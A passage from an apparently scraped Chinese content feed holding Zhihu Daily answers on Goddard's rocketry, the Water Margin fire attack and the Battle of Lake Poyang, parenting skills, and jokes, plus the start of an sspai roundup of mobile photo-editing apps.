年他痊愈之后回到了母校克拉克大学任教，在这里他正式开始了火箭的研究。</p>\n<p>当然了大家现在都知道，火箭有两个非常重要的负面特征：发射动静很大，而且死贵。</p>\n<p>戈达德当时就是面临了这两个问题的困扰。在学校里面试射火箭导致全校拉警报，不得不转移到荒郊野外去进行；随着研究进行，研发经费也越来越高了，不得不四处拉赞助。不过好在东奔西走几年总算有点成就，赞助他的史密森学会同意审阅他的研究成果，并在 1919 年发表了戈达德的研究集大成之作《<strong>到达超高空的方法</strong>》，其在论文中还提出将火箭发往月球的方案：“制造重 598.2 千克的火箭，可以把 0.9 千克的镁送到月球。火箭撞月时将镁点燃，燃烧的明亮闪光可持续几秒钟，在地球上用望远镜就可以看到它。”</p>\n<p>因为史密森学会的影响力，社会公众也因此逐渐开始了解了有这么一个蜗居在乡间农场，整天往天上发射窜天猴的大学教授。但是因为想法太过超前，加上社会并不了解其研究，戈达德的论文几乎招来了一片一边倒的嘲讽，认为他的设想完全是无稽之谈，火箭根本不可能在真空中工作。</p>\n<p>1920 年 1 月 12 日，<strong>纽约时报</strong>甚至开了大专栏“多级火箭可以到达月球”，加了个特长的副标题“史密森学会授权宣布克拉克大学物理系罗伯特·戈达德教授探索高空大气的新发明——多级火箭能把探测仪器送到 200 英里高度，更大的火箭可以在月球上着陆”，用来讽刺这个“乡下来的怪人”：</p>\n<blockquote>这位先生甚至连高中的基本物理常识都不懂，就开始整天幻想着去月球旅行了。</blockquote>\n<p>现在我们都知道了，这个“连高中的基本物理常识都不懂”的人做的一切都是对的。1921 年，他觉得之前一直在做的固体燃料火箭实在是效率低下，于是开始转向液体燃料火箭的研究，并于 1923 年 11 月成功测试了自己的第一台<strong>液氧汽油发动机</strong>。</p>\n<p>根据上一节我们知道，火箭的效率很大程度上是由发动机排气的速度来决定的。当时的固体火箭还是基于黑火药，其产生气体的比例相对较低，产生的燃烧室室压自然也就较低，于是排气速度上不去；而按照戈达德的理论，液氧和汽油这两种液体燃烧之后几乎会完全变成气体，膨胀倍率大大增加，比冲自然也就更高，比之前的固体火箭更有效率了。</p>\n<p>1926 年 1 月，马萨诸塞州的奥本，隆冬的严寒依然在肆虐。戈达德的第一枚液体火箭，经过台架测试之后，矗立在他做实验的农场上，这位年轻教授非常有雅兴地给自己和火箭来了个合影：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0e34ae5ce62e7ce2ec8a5c43d22d5546_720w.jpg?source=8673f162\" alt=\"\"></figure><p>他的，也是人类发射的第一枚液体火箭“尼尔”，总共飞行了 2.5 秒，掉在 184 英尺外的菜地里。媒体当然是例行嘲讽了他，甚至一直到 1929 年，他的家乡马萨诸塞州伍斯特的当地报纸，还在用大标题“月球火箭错过目标</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=238%2C799%5Cfrac%7B1%7D%7B2%7D\" alt=\"\"></p>\n<p>英里”来讽刺戈达德的火箭试验。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-858726dcc2003aa33d600c1bea5557f8_720w.jpg?source=8673f162\" alt=\"\"><figcaption>戈达德的第一枚液体火箭的部分残骸</figcaption></figure><p>这位伟大的火箭科学家，奠定了至今为止人类液体燃料火箭技术的基础。30 年代他试图进入美国陆军工作遭拒，军方完全没有重视火箭的潜在用途（直到战后冯·布劳恩到美国之后还是这样），一直到二战后期因为海陆军之争，海军才开始从他和他的研究同伴手里购买液体火箭专利的授权；倒是纳粹德国和苏联在这期间，还通过间谍关注着他的研究。</p>\n<p>戈达德的研究生前始终未能得以实用，他于日本投降前夕的 1945 年 8 月 10 日，因喉癌在马里兰州去世，一天前原子弹刚刚在长崎落下。他的绝大多数发明专利在死后才由其遗孀取得。</p>\n<p>多年以后，在 1969 年 7 月 17 日，阿波罗 11 号乘着土星五号奔向月球的第二天，曾经讽刺过戈达德“不切实际的妄想”的纽约时报，在醒目位置刊出了一篇标题为《<strong>更正启事</strong>》的简短文章。该文章非常简洁，用三个段落总结了 1920 年的那篇社论，最后的结论是这样的：</p>\n<blockquote>进一步的调查和实验确认 17 世纪艾萨克·牛顿的发现绝对是成立的。火箭可以在真空中跟在大气层中一样运作。纽约时报承认错误。</blockquote>\n<p>人类的航天史短短几十年，算是说得上波澜壮阔，也涌现了无数伟大的身影。但这些人背后，必然会有这三个人的影子，他们每个人都以自己的方式，为航天史的开端落下了浓墨重彩的一笔。</p>\n<p>谢谢你们给我们翅膀，让我们有希望离开摇篮，迈向星辰。</p>\n<p>顺便各位，咱都写了这么些了，真的不来玩 KSP 感受一下么（最后的安利）？</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/265624068\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737508"},{"title":"水浒传中，高俅为何将大小船只钉住，铺板相连，难道他不知道火烧赤壁？","date":"2021-06-27 23:06:50","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-d348a4281634b4ba2a4411edbae28eec_l.jpg?source=8673f162\"><span>娃娃鱼</span>\n<a href=\"https://www.zhihu.com/question/463563098/answer/1956998166\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong><strong>二败高俅与鄱阳湖大战</strong></strong></p>\n<p>“二败高俅”火烧战船的故事，并非出自《水浒传》编写者的凭空想像，而是借鉴了元末明初一场真实的大型水战。</p>\n<p><strong><strong>相隔两百年的两次水战</strong></strong></p>\n<p>侯会先生在《从“山贼”到“水寇”：水浒传的前世今生》中，曾经全面地对比了水浒故事，与南宋初年钟相、杨幺起义的相同之处，认为是借宋江之名，写钟、杨之实。</p>\n<p>在书中，侯先生特别指出，《水浒传》第十九回晁盖、三阮在蓼儿洼大败官军，和第七十九、八十回三败高俅中的几次水战，都借鉴了杨幺起义中的阳武口之战<sup>[1]</sup>（南宋绍兴三年，1133 年）。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-6993384275369de6e912c4caf323d5ee_720w.jpg?source=8673f162\" alt=\"\"></figure><p>但是，二败高俅时，吴用使用了火攻战术，却与阳武口大战有明显不同，对此，侯会先生没有论及，只是笼统地提到两处：</p>\n<ul>\n<li>小说中公孙胜祭风助火，是另从“三国”中借来的情节；</li>\n<li>高俅手下的两员水军将领刘梦龙、牛邦喜被李俊、张横捉住后，直接杀死的情节，与阳武口大捷中，朝廷的水军正副统帅崔曾、吴全皆死，极为相似。</li>\n</ul>\n<p>事实上，二败高俅一战，借鉴的不是南宋初年的钟、杨起义，而是 230 年后，元末明初的另一场水上大战：</p>\n<p><strong>1363 年，陈友谅与朱元璋的鄱阳湖大战</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-c70d5588b37980fb0accda1113b2e442_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>历史上的鄱阳湖之战</strong></p>\n<p>这一战实在太有名了，关于它的评价是：</p>\n<p><strong>鄱阳湖大战是中国历史上继赤壁之战后的又一个以少胜多的典型战例。</strong></p>\n<p>这场战役有几个关键词：</p>\n<p><strong>大船连锁、小船火攻、最终以弱胜强</strong></p>\n<p>《明史》中对这一战的记载如下：</p>\n<blockquote>友谅集巨舰，<strong>连锁为阵，</strong>太祖兵不能仰攻，连战三日，几殆。<br><br>已，东北风起，乃纵火焚友谅舟，其弟友仁等皆烧死。</blockquote>\n<p>1363 年的七月，陈友谅带领号称六十万的军队，与朱元璋在鄱阳湖的康郎山相遇。此时，陈军战舰巨大，气势非凡：</p>\n<blockquote>友谅兵号六十万，联巨舟为阵，楼橹高十余丈，绵亘数十里，旌旗戈盾，望之如山。</blockquote>\n<p>这些巨大的楼船涂着红色的漆，高三层，楼上楼下说话声音不相闻，橹箱都用铁裹住：</p>\n<blockquote>楼船数百艘，皆高数丈，饰以丹漆，每船三重，置走马棚，上下人语声不相闻，舻箱皆裹以铁。</blockquote>\n<p>而朱元璋的船太小，无法仰攻，兵力也差太多，接连三天都吃了败仗。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-9bfb763797e1ced6b84ebadd5d19a342_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图片来自网络</figcaption></figure><p>这时，部将郭兴建议用“火攻”：</p>\n<blockquote>陈友谅<strong>连巨舰以进</strong>，我师屡却，兴献计以火攻之。</blockquote>\n<p>朱元璋采纳了这个建议。</p>\n<p>当天傍晚，恰好刮起了东北风，于是朱军一方派出七艘小船，装载火药柴薪，顺风放火，火势迅速蔓延，整个湖面都烧得通红：</p>\n<blockquote>会日晡，大风起东北，乃命敢死士操七舟，实火药芦苇中，纵火焚友谅舟。风烈火炽，烟焰涨天，湖水尽赤。</blockquote>\n<p>陈军一时大乱，陈友谅的兄弟陈友仁也战死。</p>\n<blockquote>友谅兵大乱，诸将鼓噪乘之，斩首二千余级，焚溺死者无算，友谅气夺。</blockquote>\n<p>《明史》后来总结这次胜利说：</p>\n<blockquote>是战也，太祖舟虽小，然轻驶，友谅军俱艨艟巨舰，不利进退，以是败。</blockquote>\n<p>（以上引文，均出自《明史》）</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4e0f17d017470d9f9441294dcd64788a_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>与水浒故事的对比</strong></strong></p>\n<p>《水浒传》第七十九回《刘唐放火烧战船 宋江两败高太尉》中写到“火攻”的情景：</p>\n<blockquote>刘梦龙急教棹船时，只见芦苇丛中，藕花深处，小港狭汊，都棹出小船来，钻入大船队里，鼓声响处，一齐点着火把。<br><br>原来这小船上，都是吴用主意授计与刘唐，尽使水军头领，装载芦苇干柴硫黄焰硝，杂以油薪。霎时间大火竟起，烈焰飞天，四分五落，都穿在大船内，前后官船，一齐烧着。</blockquote>\n<p>以小船穿梭在大船中间放火，是鄱阳湖之战的特点，是以小胜大的成功案例。</p>\n<p>而高俅这边，在船只上用板铺、用铁环锁定的做法，也是陈友谅军队的实际情况：</p>\n<blockquote>（高俅）便传号令，教把船都放入阔港，每三只一排钉住，上用板铺，船尾用铁环锁定；尽数拨步军上船，其余马军，近水护送船只。</blockquote>\n<figure><img src=\"https://pic2.zhimg.com/v2-26e3f6bc572596d0af4dd07f8e32f898_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这么做其实是有好处的。</p>\n<p>高大的楼船连缀起来，非常稳固，可以运送大量步兵甚至马军，同时也对小战船形成了大山压顶的气势。</p>\n<p>鄱阳湖一战中，朱元璋前几天的失败就是证明。</p>\n<p>当然，有利则必有弊，缺点就是容易被火攻。</p>\n<p>不过，火攻也需要条件，那就是风向。</p>\n<p>鄱阳湖之战中，傍晚时分突然刮起的东北风帮了朱元璋的大忙，而在《水浒传》中，则直接由大法师公孙胜施法祭风，想往哪里刮，就往哪里刮，取胜容易多了。</p>\n<p><strong><strong>小结：</strong></strong></p>\n<p>《水浒传》的成书时间，目前有两个说法，一是元末明初，洪武初年；二是明嘉靖年间，1533 年左右。</p>\n<p>关于编著者施耐庵的生平，流传较广的看法，是他曾担任过张士诚的谋士。《施耐庵墓志》上说他：“生于元贞丙申岁……殁于明洪武庚戌岁”，也就是 1296 年 -1370 年，享年 74 岁，是陈友谅、朱元璋的同时代人。</p>\n<p>不过，无论是哪一种说法，《水浒》的编著者对于大明开国皇帝用火攻的方式，以小船胜连锁大船，取得鄱阳湖水战决定性胜利的辉煌战绩肯定都了然于心，拿来作为写作素材自然也很顺手。</p>\n<p>如果你问，陈友谅知道赤壁之战的事吗？肯定是知道的。</p>\n<p>那他为什么还会把船钉起来呢？</p>\n<p>因为历史有时候就是会一再重演。</p>\n<p>2021.6.23</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/463563098\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737501"},{"title":"如果为人父母也需要考试，应该有哪些科目？","date":"2021-06-27 23:06:42","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-1afdab2700ecdaf30f15574afbcf4d10_l.jpg?source=8673f162\"><span>菜妈和钱爸，</span><span>复旦大学营养学硕士，丁香妈妈签约作者，三年抱俩高知妈妈！</span>\n<a href=\"https://www.zhihu.com/question/465553584/answer/1952862584\" hidden>阅读原文</a>\n</div>\n<div>\n<p>记得有句网评曾说：“一想到为人父母不经过考试就可以上岗，真的是太可怕了。”近年来国内外一些虐待儿童的事件频发，而很多虐童案件的施暴者就是孩子的亲生父母。</p>\n<p>本应该是孩子最亲近的人却给孩子带来了最大的伤害，而这种伤害不仅仅是肉体上的，更是伴随着孩子一生的成长，难以抚平。为人父母是一件看似简单而自然的事，但是成为合格的父母，并不容易，需要学习更需要在养育孩子的过程中不断和孩子一同成长。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-974fe348ce3f77018d112865c13fa4e1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>长城上面合个照</figcaption></figure><p><strong><strong>育儿知识</strong></strong></p>\n<p>让新手爸妈崩溃，手足无措的，一定是娃的各种状况。夜醒、哭闹、生病……如果在娃出生前，能够系统的学习育儿知识，那么在孩子出生后就会轻松应很多，也会少走弯路，创造和谐的家庭氛围。</p>\n<p>比如，娃又哭了，是不是饿了？娃总醒，是不是母乳不够没吃饱？总觉得孩子的一举一动都是没吃饱，一哭就喂奶。其实很多小月零宝宝存在胀气问题，才会哭闹，如果一直喂奶，会造成更严重的胀气，这时候给宝宝做一下排气操，飞机抱，就会缓解很多。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-21b3b5309346751ae5ab39700cfd9d57_720w.jpg?source=8673f162\" alt=\"\"><figcaption>排气操</figcaption></figure><p>这一点都不是危言耸听，因为无法安抚宝宝，妈妈一度自责抑郁，爸爸无所适从，加上婆婆妈妈各种错误的指导，可能会陷入一个恶性循环的怪圈。所以多学习科学育儿知识，对孩子进行健康正确的喂养护理，这是为人父母需要必修的第一课，也是至关重要的一课。对于孩子的健康长大，家庭的关系，还有产后妈妈的情绪恢复都是十分必要的。</p>\n<p><strong><strong>德育知识</strong></strong></p>\n<p>育儿先育己，那么为人父母一定要有良好的品德，担当起为人父母的职责，给孩子树立起正确的学习生活习惯。很多虐童事件的缘由都很很简单，父母因为生活压力，情绪失控，所以把心中怒火发在孩子身上。因为不想负责，只想自己快活，把孩子仍在一边不管不顾，造成孩子各种伤害甚至是死亡。</p>\n<p>比如，孩子出生后就丢给老人带，不管不问，周末偶尔来吃个饭就走。还像没结婚之前那般自由。在小区楼下散步，经常会听到一些老人抱怨，这个孩子简直是成了他们的孩子，孩子和父母一点也不亲，像陌生人。</p>\n<p>在成为父母前，在把一个生命带到这个世界上来的时候，一定要想好，并且正真去履行这份职责和责任。因为一个孩子的出生，不是一个随随便便的游戏，不能轻易按下暂停。孩子更不是一件商品，可以随意丢弃或者退货。生而不养，是一场道德的悲剧，养而不教，是一场成长的缺失。</p>\n<p>首先在生孩字前，明确自己为什么要生这个孩子，生了孩子后要如何去养育他。其次在生孩字前做好一定的准备，物质上、经济上的，来保证孩子能够顺利的降生和长大。</p>\n<p>而不是毫无准备，到时候手足无措，甚至无法保证孩子的吃喝拉撒，那么也更无从谈教育。还有就是在孩子出生后，要注意自身的素质，父母的一举一动，一言一行都是孩子模仿的对象，错误的举动和言语，都会给孩子带来不利的影响。</p>\n<p><strong><strong>情绪控制知识</strong></strong></p>\n<p>很多时候，在孩子不听话的时候，家长对于自身的情绪控制其实也起到了很关键的作用。家长不能很好的控制自己的情绪，往往对孩子的管教会起到反面的作用，让孩子的哭闹更厉害，更难以安抚。</p>\n<p>常见情景：孩子摆积木，摆不好，发脾气，父母先是训斥孩子，然后说：在哭，积木扔了不要玩了。如果孩子还哭闹，父母一把将积木扔掉，结果孩子哭的更厉害。教育效果没达到，孩子哭的上气不接下气。如果在孩子搭积木遇到困难，发脾气时，可以先询问孩子原因，然后开导孩子不要生气，并且帮助指导孩子一起完成，这样就不会有孩子家长一起崩溃的局面产生。</p>\n<p>这里也分享过一些自己的看法，欢迎交流~</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s%3F__biz%3DMzg5NDE4NTY4MQ%3D%3D%26mid%3D2247556920%26idx%3D1%26sn%3Da365e0b86624fd60b9b5022cecce7414%26chksm%3Dc0212686f756af904bafa2f2e6630447c9b43087f29cc9d997c2ca58d9a45b8d140f26c4e8ea%26token%3D1561532560%26lang%3Dzh_CN%23rd\" target=\"_blank\" rel=\"nofollow noreferrer\">为什么我控制不住，对孩子又一次发火了...</a></p>\n<p>情绪控制说来简单，做起来很难。一面说着要不发火，可有时候孩子的一个举动家长的情绪就像一颗定时炸弹瞬间，瞬间爆炸。而这样对于孩子失控的情绪无疑是雪上加霜。所以说情绪控制，对于孩子的教育也十分重要。在让孩子能够听话懂事的时候，家长在教育孩子时先学会控制自己的情绪是前提。</p>\n<p>冷静对待孩子的一些哭闹行为，认真倾听孩子的诉求，根据孩子的实际情况去允许其发泄自己的不良情绪，并且给孩子一个正确的发泄方式和方法，而不是以暴制暴去压制和训斥。</p>\n<p><strong><strong>语言沟通知识</strong></strong></p>\n<p>沟通可以建立起人与人之间的有效连接，同时也是父母加深对孩子了解的有效手段。“恶语伤人六月寒，良言一句三冬暖。”充分说明了语言表达的作用，在面对孩子时，语言沟通也是一门值得不断学习和摸索的技能。</p>\n<p>常见情景：放学后，询问孩子：你吃饱了吗？今年有没有同学欺负你？老师批评你了吗？全是负面暗示加上老生常谈，孩子估计也很难有兴趣回答。</p>\n<p>如果问孩子：今天有哪些有意思的事发生了？你又交到新朋友了吗？学了哪些新知识？孩子可能会打开话匣子，说个没完。</p>\n<p>如何说话孩子爱听，如何把话说到孩子的心里，如何能让孩子乖乖听话，这些都是家长们要去注意的。注意语音语调，尽量温柔平稳，注意长对孩子进行积极的肯定，用鼓励去代替批评，把严厉的话用孩子能够接受的方式表达出来，多关心孩子从孩子日常感兴趣的话题代替一些重复的啰嗦，这样的语言沟通会给孩子带来不一样的教育效果。</p>\n<p>也许我们都是第一次为人父母，我们虽然不能做百分之百完美的父母，但是至少要尽力而为，不断去学习，去学着带给孩子更多更好的成长体验。要学习的有太多，但是最重要的是给孩子一个温暖和谐的家庭，给孩子一个充满爱的成长空间，陪伴他们一起长大。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/465553584\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737515"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-06-27 23:06:39","description":"\n<div>\n<h2>哪个瞬间你觉得自己很蠢？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>悟空，</span><span>已多年不走路，靠丁丁曲伸前行，远看像一豆虫…</span>\n<a href=\"https://www.zhihu.com/question/62706827/answer/201815175\" hidden>阅读原文</a>\n</div>\n<div>\n<p>“老师，你忘了布置作业！”</p>\n<p>——来自诺基亚 560 客户端，北京市植物人医疗保障中心二楼重症监护室</p>\n<p>舌头打字不易，请您多一点关爱。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/62706827\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>有没有人装逼正好撞到你擅长的领域上的？</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-5d2b64cdd5db468a0f7b15e6ca458d47_l.jpg?source=8673f162\"><span>V-Hohenheim，</span><span>交通工程</span>\n<a href=\"https://www.zhihu.com/question/338688699/answer/1850996561\" hidden>阅读原文</a>\n</div>\n<div>\n<p>某次春节在家参加一个亲朋聚会，当时到晚了，就听见有个号称来自北京的专家（后面了解是长辈朋友）在解读近期刚出台的某个交通领域很火的政策文件。说到某个点的时候，专家分析了很多说国家应该是怎么怎么考虑的，下一步可能是什么意思。我顺口接了一局，应该不是吧。专家立马开始说教，意思说自己在行业内地位多高，多少多少朋友，年轻人不要乱说话...然后我弱弱的回了一句，这文件我起草的，当时确实没这么考虑....场面一度无比尴尬。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/338688699\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>世界首款 AI 仿生猫 MarsCat 通过解析能做出类似真猫的动作，技术含量如何？你会选择仿生猫吗？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>财哥家铲屎官，</span><span>9只猫的铲屎官</span>\n<a href=\"https://www.zhihu.com/question/464414621/answer/1935032952\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我觉得可以买一只回家逗猫。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/464414621\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>有哪些让人眼前一亮的「老段子翻新」？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-4fe7349713f01c53aa5e1c723a7ab97e_l.jpg?source=8673f162\"><span>孙凯三，</span><span>在任何话题下均没有回答经验</span>\n<a href=\"https://www.zhihu.com/question/49658352/answer/171591290\" hidden>阅读原文</a>\n</div>\n<div>\n<p>在某快餐店正点餐呢，一大姐窜到我前面，就像没排过队一样对着服务员喊：两个红豆派，快点，我赶时间！</p>\n<p>服务员提醒道：不好意思，是这位先生先来的，请您排队！</p>\n<p>这位大姐很不情愿的排在了我后面。</p>\n<p>我怒从心中起，恶向胆边生，大声问了一句：红豆派还有几个？</p>\n<p>服务员：九十五个。</p>\n<p>我转过头：</p>\n<p>听见没有，急什么？</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-e7d4b68da69bd746f5a56037aadcb8ed_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/49658352\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>法学专业都有哪些梗？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>匿名用户</span>\n<a href=\"https://www.zhihu.com/question/344489828/answer/819931916\" hidden>阅读原文</a>\n</div>\n<div>\n<p>北大某教授，外号是中国民法。原因很简单，他爸是中国民法之父。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/344489828\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9737524"},{"title":"2021 年，这些手机修图工具帮你留住更多美好瞬间","date":"2021-06-27 07:00:00","description":"\n<p>拍照、修图、发朋友圈——时至 2021 年，这依然是许多人出门的习惯动作。的确，当手机已经像器官一样跟随我们的身体，「随手拍」这件事就已经超越了摄影的范畴，成了流行文化的一部分。正因如此，每个人的手机里至少要装三五个修图类 app，才让自己的照片可以在社交媒体中迅速吸引朋友们的目光。</p>\n<p>在这篇文章里，我们盘点了截至 2021 中旬，有哪些不错的修图 app 值得你下载和使用。其中既有类似 Snapseed、VSCO 这样自诞生起就热度不减的经典产品，也有一些相对冷门或小众的工具。无论你是刚刚爱上拍照的懵懂新人，还是已经 po 图无数的修图老手，这些推荐都能帮你找到更适合自己的那一款。</p>\n<p>另外，为了不让这篇文章变成一个没有边界的流水账，本篇正文部分所指的「修图 app」有两个限定条件：其一是仅限手机平台，其二是 app 的功能集中在照片的后期调色、裁切等，前期拍摄类（如 Halide、ProCam 等）和标注类（如 Annotable 等）不在此列。不过，如果你有用到值得推荐的摄影相关 app，无论是什么类型，都欢迎你在评论区自由分享和补充。</p>\n<h2>后期预处理类</h2>\n<p>在这个部分中，我想推荐几款最受用户欢迎、综合品质最高的后期处理 app。在桌面端，此类 app 的最佳代表就是 Adobe Lightroom 和逐渐流行的 Capture One。但移动端，你也有专业、好用的照片预处理工具可用。它们在照片处理能力上不输桌面端，还专门为移动平台的操作和效能做了专门优化。手机摄影后期的第一步，就从它们开始吧。</p>\n<h3>全能的专业工具——Adobe Lightroom for Mobile</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/article/846df74854edbf2d6a8a4319412e8d2d\"></figure><ul><li>关键特性：与桌面端一致的专业修图能力、RAW 格式处理</li></ul>\n<p>Lightroom 是 Adobe 旗下的经典产品，也是摄影领域知名度最高、最受摄影师欢迎的照片处理工具。2017 年，Adobe 为了适应互联网的发展，将之前的 Lightroom 改名为 Lightroom Classic，并推出了适应多平台的新版 Lightroom。之后不久，Adobe 又将新版 Lightroom 带到了移动平台。Adobe Lightroom for Mobile 的核心功能及使用体验都与桌面版别无二致，只是产品介面和部分操作针对移动平台进行了特别优化。</p>\n<p>正是有了「核心功能与桌面版别无二致」这个前提，使用 Lightroom Mobile 在手机上处理照片可以实现与桌面端一样的效果——无论基础的亮度、色彩调节，还是进阶的直方图、HSL、曲线等，又或者照片筛选、标星等，均可使用 Lightroom for Mobile 完成。借助 Adobe Creative Cloud 服务，所有桌面端的个性化配置、照片版本和修改历史等均可以云端同步，就连桌面端的预设（Presets）也能在手机上使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/article/6000233059cb8fb811382c1e4465a770\"><figcaption>Adobe Lightroom for Mobile 可以实现桌面端的几乎全部功能</figcaption></figure><p>和 Lightroom Classic 相比，通用版 Lightroom 的最大变化在于去掉了本地照片库，所有导入 Lightroom 的照片都会自动保存至 Creative Cloud 云空间内。所以，通用版 Lightroom 在桌面端还不能完全成为 Lightroom Classic 的替代品。但对于拍摄量不大、作品主要发布在社交媒体上的手机摄影爱好者来说，Adobe Lightroom for Mobile 提供的功能已经足够充分且专业。</p>\n<ul><li>关联阅读：《<a href=\"https://sspai.com/post/66756\" target=\"_blank\">如何用 Lightroom 更高效整理与归档照片</a>》</li></ul>\n<h3>滤镜之王——VSCO</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/article/5444261e32ff744ff4378e244d07c225\"></figure><ul><li>关键特性：胶片滤镜模拟</li></ul>\n<p>自主打还原真实胶片滤镜质感的 VSCO 诞生以来，这款 app 在「滤镜界」的地位就从未真正动摇过。在推出移动端应用之前，VSCO 曾推出了专门为 Lightroom 和 Photoshop 等打造的滤镜预设产品 VSCO Film。但目前这套产品已经停止更新，VSCO 团队把精力都投入了移动端的产品开发。</p>\n<p>如开头所言，VSCO 之所以广受欢迎，主要在于其内置了丰富的高仿胶片滤镜，你可以很容易在其中找到柯达、富士等经典胶卷的影子。不过，如今的 VSCO 已经不只是个「滤镜盒子」，处理照片所需的基础能力它也全都具备，诸如常用的参数调节、照片裁切等完全不在话下，加完滤镜之后还能添加边框，甚至把作品发布到 VSCO 照片社区。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/article/42c8f02a368be6f23cb5b316d73b48b1\"><figcaption>除了加胶片滤镜和调整图像，VSCO 也有一个类似 Instagram 的社区</figcaption></figure><p>除了修图，VSCO 还在此前的一次大版本更新中加入了视频滤镜功能，更符合时下视频媒介流行的趋势。简言之，尽管滤镜才是 VSCO 的强项，但它仍是个处处可用的一站式后期处理工具。</p>\n<ul>\n<li>关联阅读：《<a href=\"https://sspai.com/post/39494\" target=\"_blank\">这 9 篇文章，带你入门手机上的「滤镜之王」： VSCO | 专题推荐</a>》</li>\n<li>关联阅读：《<a href=\"https://sspai.com/post/66842\" target=\"_blank\">VSCO 深度用户｜用了六年的照片调色 App</a>》</li>\n</ul>\n<h3>事无巨细——Snapseed</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/article/b663a1f7fbe37e3737d60043252e33cf\"></figure><ul><li>关键特性：符合用户直觉的操作逻辑、全面的修图能力</li></ul>\n<p>Snapseed 是一款经典老牌修图工具，也是许多专业摄影师最爱的移动端修图 app。和 Lightroom 类似，Snapseed 也可以独立完成照片后期预处理的工作，而且在部分功能上比 Lightroom 更加丰富，如 HDR 特效处理、双重曝光、加文字及边框等。简言之，Snapseed 作为一款移动端原生的修图工具，找到了「专业」和「易用」之间的平衡点。</p>\n<p>许多摄影爱好者选择 Snapseed 的原因是其具备诸如曲线调节等专业修图工具才有的功能，但在操作上更符合移动端的使用特性，大部分照片微调工作都可以通过上下、左右滑动来完成，不用做精细的点击和选择，在大量修图时更加省力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/article/4a81f7ed2afc593695237d423973a40f\"><figcaption>点划操作是 Snapseed 的标志</figcaption></figure><p>此外，在品质颇高的前提下，Snapseed 完全免费。尽管许多摄影爱好者的手机里都囤积了大量付费的修图 app，但 Snapseed 仍是他们使用频率最高、最不愿割舍的那个。</p>\n<h2>特殊处理类</h2>\n<p>除了进行裁切、调色等工作外，很多时候还需要对照片进行特殊处理。在这个部分里，我们筛选了几个在功能上具有很强代表性且非常实用的工具。它们不具备完整的后期处理能力，却专精于某些特殊能力。用好这些工具，能让你的照片更出彩。</p>\n<h3>去除多余元素——TouchRetouch</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/article/d572e7c873470d5f8c5ca140d264dcd7\"></figure><ul><li>关键特性：杂物去除</li></ul>\n<p>照片拍摄中经常遇到这样的问题：你想拍摄一片纯净的大海，按下快门时才发现两个人不小心入画，再想等待没人的画面却已经错过了最佳时机。面对此类情况，TouchRetouch 能帮你把画面里多余的元素抠掉，给你一个干净的画面。</p>\n<p>在 TouchRetouch 中，只需要将待处理的图片导入应用，划动手指选定区域，它就会通过机器学习算法自动分辨需要删掉的物体，并将该区域涂抹得与周围环境融为一体。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/article/db07a45e5deea97ae752721e08f4b6d2\"></figure><p>TouchRetouch 的识别算法非常准确，在许多场景下都可以「以假乱真」。不仅如此，划动手指的操作方式也更加符合直觉，单就「把某些元素抠掉」这一目标来说，使用 TouchRetouch 甚至比在电脑上用鼠标选区更为方便。</p>\n<p>除了 iOS 和 Android，TouchRetouch 还有 